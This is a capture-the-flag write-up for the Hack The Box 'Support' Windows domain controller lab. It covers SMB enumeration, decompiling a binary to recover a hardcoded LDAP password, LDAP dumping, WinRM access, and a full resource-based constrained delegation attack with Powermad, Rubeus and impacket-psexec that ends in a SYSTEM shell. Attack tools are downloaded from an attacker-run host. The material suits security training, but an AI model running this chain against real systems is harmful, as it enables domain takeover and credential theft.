## Support 

### Lab Details 

- Difficulty: Easy
- Type: SMB share, Winrm, Decompiling, AD, Windows

#### Tasks

Q1: How many shares is Support showing on SMB?
- nmap scan on target
```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-24 07:14:33Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack Microsoft Windows RPC
49739/tcp open  msrpc         syn-ack Microsoft Windows RPC
```
- port 139 and 445 are for SMB
- use `smbclient` to view the list of SMB shares
- 6 shares in total
```
smbclient -L //10.10.11.174 -N            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```

Q2: Which share is not a default share for a Windows domain controller?
- non-default share is the `support-tools` share

Q3: Almost all of the files in this share are publicly available tools, but one is not. What is the name of that file?
- use `smbclient` to communicate with the SMB server
```
$ smbclient //10.10.11.174/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 10:01:06 2022
  ..                                  D        0  Sat May 28 04:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 04:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 04:19:55 2022
  putty.exe                           A  1273576  Sat May 28 04:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 04:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 10:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 04:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 04:19:43 2022

                4026367 blocks of size 4096. 970421 blocks available
```
- the file that is not publicly available is `UserInfo.exe.zip`
Q4: What is the hardcoded password used for LDAP in the UserInfo.exe binary?
- used `dnSpy` for decompiling the program
- unzip the program folder and load the executable program to `dnSpy`
![[LdapQuery.png]]
- there's a interesting function called `getPassword()`
- this function taking in a hard-coded password string `enc_password` and decrypts using a key `armando`
- below is python code that decrypts the password
```
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
decoded = base64.b64decode(enc_password)

decrypted = []
for i in range(len(decoded)):
    decrypted_byte = decoded[i] ^ key[i % len(key)] ^ 223
    decrypted.append(decrypted_byte)

password = bytes(decrypted).decode('ascii', errors='ignore')
print(password)
```
- `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` is the plaintext
Q5: Which field in the LDAP data for the user named support stands out as potentially holding a password?
- run `ldapdomaindump ldap://support.htb -u "support\\ldap" -p "nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz"`
- which generates a plethora of files 
- below is `domain_users.json`, which contains the password for user support in the `info` field
```
,{
    "attributes": {
        "accountExpires": [
            "9999-12-31 23:59:59.999999+00:00"
        ],
        "badPasswordTime": [
            "1601-01-01 00:00:00+00:00"
        ],
        "badPwdCount": [
            0
        ],
        "c": [
            "US"
        ],
        "cn": [
            "support"
        ],
        "codePage": [
            0
        ],
        "company": [
            "support"
        ],
        "countryCode": [
            0
        ],
        "dSCorePropagationData": [
            "2022-05-28 11:12:01+00:00",
            "1601-01-01 00:00:00+00:00"
        ],
        "distinguishedName": [
            "CN=support,CN=Users,DC=support,DC=htb"
        ],
        "info": [
            "Ironside47pleasure40Watchful"
        ],
   <snip>
    },
    "dn": "CN=support,CN=Users,DC=support,DC=htb"
```

Q6: What open port on Support allows a user in the Remote Management Users group to run PowerShell commands and get an interactive shell?
- port 5985 is allocated for Winrm and we can use `evil-winrm` to gain RCE over target
```
$ evil-winrm -i 10.10.11.174  -u support -p Ironside47pleasure40Watchful
```

Q8: Bloodhound data will show that the support user has what privilege on the DC.SUPPORT.HTB object?
- load and execute `sharphound.exe` on target
- we can download the output zip file using `download` command in `evil-winrm`
- start up `bloodhound` and we can analyse the relationship between the two nodes
![[GenericAll.png]]
Q9: A common attack with generic all on a computer object is to add a fake computer to the domain. What attribute on the domain sets how many computer accounts a user is allowed to create in the domain?
- we can view the windows abuse tab by clicking on the `GenericAll` which tells us what attack we can use to exploit the privilege
![[GenericAll Exploit.png]]
- we can use `powermad` to facilitate the exploit: https://github.com/Kevin-Robertson/Powermad
- `ms-DS-MachineAccountQuota` states the amount of machine acounts domain users can add to the domain

Q11: What is the name of the environment variable on our local system that we'll set to that ccache file to allow use of files like psexec.py with the -k and -no-pass options?
- we will need below tools to perform the attack
```
wget http://10.10.16.20:8000/Powermad.ps1 -o Powermad.ps1
## Rubeus can be downloaded via sudo apt install rubeus on Kali
wget http://10.10.16.20:8000/Rubeus.exe -o Rubeus.exe
```
- Below are the chain of commands
```
## On target via evil-winrm
## create a new machine account
New-MachineAccount -MachineAccount Attacker-COMP -Password $(ConvertTo-SecureString 'Summer2018' -AsPlainText -Force)

## verify the account
Get-ADComputer -identity Attacker-COMP

## set PrincipalsAllowedToDelegateToAccount to new machine account
## requires import-module ./Powermad.ps1
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount Attacker-COMP$

## run Rubeus to get the rc4_hmac hash
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Summer2018 /user:Attacker-COMP$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018
[*] Input username             : Attacker-COMP$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostattacker-comp.support.htb
[*]       rc4_hmac             : 7F4F718D5029000926A9278C5CFD0872
[*]       aes128_cts_hmac_sha1 : 9257A219F77B87737980CC342CCD506F
[*]       aes256_cts_hmac_sha1 : 5305A5991424610D07FBEA696244A575866F7F8D301DD00F503DFF11137D68F6
[*]       des_cbc_md5          : 6D6783E085B96897

## perform the s4u attack 
## save the last ticket named base64(ticket.kirbi) for SPN 'cifs/dc.support.htb'
./Rubeus.exe s4u /user:Attacker-COMP$ /rc4:7F4F718D5029000926A9278C5CFD0872 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```
- once we have saved the last ticket on our end, we can then perform the ptt with the ticket
- **NOTE** - need to remove all whitespaces when coping the ticket across
- **NOTE** - if error arises with regard to SMB `STATUS_MORE_PROCESSING_REQUIRED`, you will need to sync the machine time with the DC
```
## on attacker
## decodes the ticket generated 
$ base64 -d ticket1 > ticket.kirbi

## converts ticket.kirbi into ccache format
$ impacket-ticketConverter ticket.kirbi ticket.ccache

## sync local time with DC time
$ sudo rdate -n 10.10.11.174                       
Fri Jul 25 07:02:58 PDT 2025
                                                                              
$ KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass -debug support.htb/administrator@dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:dc.support.htb[\pipe\svcctl]
[+] Using Kerberos Cache: ticket.ccache
[+] Returning cached credential for CIFS/DC.SUPPORT.HTB@SUPPORT.HTB
[+] Using TGS from cache
[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file zuqTGumC.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service iikF on dc.support.htb.....
[*] Starting service iikF.....
[+] Using Kerberos Cache: ticket.ccache
[+] Returning cached credential for CIFS/DC.SUPPORT.HTB@SUPPORT.HTB
[+] Using TGS from cache
[+] Using Kerberos Cache: ticket.ccache
[+] Returning cached credential for CIFS/DC.SUPPORT.HTB@SUPPORT.HTB
[+] Using TGS from cache
[!] Press help for extra shell commands
[+] Using Kerberos Cache: ticket.ccache
[+] Returning cached credential for CIFS/DC.SUPPORT.HTB@SUPPORT.HTB
[+] Using TGS from cache
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
#### Resources
- Rubeus.exe: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
- Powermad.ps1 https://github.com/Kevin-Robertson/Powermad
- Remove whitespaces: https://www.browserling.com/tools/remove-all-whitespace

#### Lesson Learned

